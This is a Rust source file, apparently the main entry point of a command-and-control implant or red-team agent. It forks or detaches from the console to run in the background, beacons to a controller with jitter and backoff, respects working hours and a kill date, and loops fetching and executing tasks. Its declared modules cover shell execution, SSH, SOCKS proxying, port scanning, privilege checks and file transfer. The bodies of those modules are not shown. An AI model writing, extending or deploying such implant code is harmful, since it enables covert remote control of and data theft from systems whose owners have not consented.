use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime};
use chrono::Duration;
use std::error::Error;

use crate::agent::calculate_sleep_time;
use crate::agent::Agent;

mod agent;
mod cat;
mod cd;
mod cp;
mod download;
mod exit;
mod getenv;
mod getprivs;
mod jobs;
mod ls;
mod mkdir;
mod mv;
mod netstat;
mod payloadvars;
mod portscan;
mod profiles;
mod ps;
mod pwd;
mod redirect;
mod rm;
mod setenv;
mod shell;
mod sleep;
mod socks;      
mod ssh;
mod tasking;
mod unsetenv;
mod upload;
mod utils;
mod workinghours;

/// Real entrypoint of the program.
/// Checks to see if the agent should daemonize and then runs the main beaconing code.
pub fn real_main() -> Result<(), Box<dyn Error>> {
    if let Some(daemonize) = option_env!("daemonize") {
        if daemonize.eq_ignore_ascii_case("true") {
            #[cfg(target_os = "linux")]
            if unsafe { libc::fork() } == 0 {
                run_beacon()?;
            }

            #[cfg(target_os = "windows")]
            if unsafe { winapi::um::wincon::FreeConsole() } != 0 {
                run_beacon()?;
            }

            return Ok(());
        }
    }

    run_beacon()?;
    Ok(())
}

/// Main code which runs the agent
fn run_beacon() -> Result<(), Box<dyn Error>> {
    let mut agent = Agent::new();
    let mut interval = payloadvars::callback_interval();
    let mut tries = 1;

    loop {
        let now: DateTime<Local> = std::time::SystemTime::now().into();
        let now: NaiveDateTime = now.naive_local();

        let working_start = NaiveDateTime::new(now.date(), payloadvars::working_start());
        let working_end = NaiveDateTime::new(now.date(), payloadvars::working_end());

        if now < working_start {
            let delta =
                Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
            std::thread::sleep(delta.to_std()?);
        } else if now > working_end {
            let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
            let delta =
                Duration::seconds(next_start.and_utc().timestamp() - now.and_utc().timestamp());
            std::thread::sleep(delta.to_std()?);
        }

        if now.date() >= NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d")? {
            return Ok(());
        }

        if agent.make_checkin().is_ok() {
            break;
        }

        if tries >= payloadvars::retries() {
            return Ok(());
        }

        let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
        std::thread::sleep(std::time::Duration::from_secs(sleeptime));
        tries += 1;
        interval *= 2;
    }

    loop {
        let pending_tasks = agent.get_tasking()?;
        agent
            .tasking
            .process_tasks(pending_tasks.as_ref(), &mut agent.shared)?;
        agent.sleep();

        let completed_tasks = agent.tasking.get_completed_tasks()?;
        let continued_tasking = agent.send_tasking(&completed_tasks)?;
        agent
            .tasking
            .process_tasks(continued_tasking.as_ref(), &mut agent.shared)?;

        if agent.shared.exit_agent {
            break;
        }

        agent.sleep();
    }

    Ok(())
}
